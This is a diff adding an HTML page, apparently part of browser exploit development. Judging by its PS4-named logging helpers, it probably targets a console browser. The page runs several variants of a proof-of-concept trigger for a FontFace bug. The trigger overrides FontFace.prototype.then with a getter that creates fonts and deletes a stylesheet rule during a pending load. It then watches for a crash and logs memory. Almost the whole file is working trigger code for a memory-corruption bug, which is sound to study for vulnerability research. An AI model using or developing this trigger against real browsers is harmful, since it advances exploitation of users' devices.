@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Phase 0 — Characterize FontFace bug</title>
+<!-- UI styles in a separate sheet so #s only contains @font-face (matches test.html) -->
+<link rel="stylesheet" href="01-ui.css">
+<style id="s">
+@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }
+</style>
+</head>
+<body>
+<div id="status">auto-running original POC in 1s...</div>
+<div id="log"></div>
+<script src="00-logger.js"></script>
+<script>
+// Mirrors test.html trigger order exactly:
+//   1. create A, add, void A.loaded  (BEFORE hook)
+//   2. install then hook
+//   3. document.fonts.load() fire-and-forget (NO await)
+
+function runExactOriginal(label) {
+    ps4log(`--- ${label}: starting (test.html order) ---`);
+
+    let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+    document.fonts.add(A);
+    void A.loaded;
+
+    let fired = false;
+    let thenHits = 0;
+    Object.defineProperty(FontFace.prototype, 'then', {
+        configurable: true,
+        get() {
+            thenHits++;
+            ps4log(`${label}: then getter #${thenHits}, this===A: ${this === A}, family: ${this.family || '?'}`);
+            if (!fired && this === A) {
+                fired = true;
+                ps4log(`${label}: trigger body firing`);
+                new FontFace('y', 'local(Helvetica Bold)', { unicodeRange: 'U+0041' });
+                new FontFace('z', 'local(Helvetica Italic)', { unicodeRange: 'U+0041' });
+                document.getElementById('s').sheet.deleteRule(0);
+                document.body.offsetTop;
+            }
+            return undefined;
+        }
+    });
+
+    document.fonts.load('1em x', 'AB');
+    ps4log(`${label}: document.fonts.load() called (not awaited)`);
+    return thenHits;
+}
+
+function runNoDelete() {
+    ps4log('--- variant: no deleteRule ---');
+    let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+    document.fonts.add(A);
+    void A.loaded;
+
+    let fired = false;
+    Object.defineProperty(FontFace.prototype, 'then', {
+        configurable: true,
+        get() {
+            if (!fired && this === A) {
+                fired = true;
+                ps4log('no-delete: trigger body firing');
+                new FontFace('y', 'local(Helvetica Bold)', { unicodeRange: 'U+0041' });
+                new FontFace('z', 'local(Helvetica Italic)', { unicodeRange: 'U+0041' });
+                document.body.offsetTop;
+            }
+            return undefined;
+        }
+    });
+
+    document.fonts.load('1em x', 'AB');
+}
+
+function runNoThen() {
+    ps4log('--- variant: no then hook ---');
+    let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+    document.fonts.add(A);
+    void A.loaded;
+    document.fonts.load('1em x', 'AB');
+    ps4log('no-then: load called');
+}
+
+function runDirectThen() {
+    ps4log('--- variant: A.load().then() path ---');
+    let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+    document.fonts.add(A);
+
+    let fired = false;
+    Object.defineProperty(FontFace.prototype, 'then', {
+        configurable: true,
+        get() {
+            ps4log(`direct: then getter, this===A: ${this === A}`);
+            if (!fired && this === A) {
+                fired = true;
+                new FontFace('y', 'local(Helvetica Bold)', { unicodeRange: 'U+0041' });
+                new FontFace('z', 'local(Helvetica Italic)', { unicodeRange: 'U+0041' });
+                document.getElementById('s').sheet.deleteRule(0);
+                document.body.offsetTop;
+            }
+            return undefined;
+        }
+    });
+
+    A.load().then(function () {
+        ps4log('direct: A.load().then callback');
+    });
+}
+
+// ?test=original | no-delete | no-then | direct | all
+const params = new URLSearchParams(location.search);
+const test = params.get('test') || 'original';
+
+window.onload = function () {
+    ps4log('Phase 0 characterize');
+    ps4log('UA: ' + navigator.userAgent);
+    ps4mem();
+
+    ps4status('running: ' + test, '#ff0');
+
+    if (test === 'all') {
+        runExactOriginal('original');
+        setTimeout(function () { runNoDelete(); }, 500);
+        setTimeout(function () { runNoThen(); }, 1000);
+        setTimeout(function () { runDirectThen(); }, 1500);
+    } else if (test === 'no-delete') {
+        runNoDelete();
+    } else if (test === 'no-then') {
+        runNoThen();
+    } else if (test === 'direct') {
+        runDirectThen();
+    } else {
+        runExactOriginal('original');
+    }
+
+    ps4log('If bug triggers, browser may crash before next line');
+    setTimeout(function () {
+        ps4status('survived 3s after trigger', '#0f0');
+        ps4log('still alive after 3s — bug may not have fired');
+        ps4mem();
+    }, 3000);
+};
+</script>
+</body>
+</html>
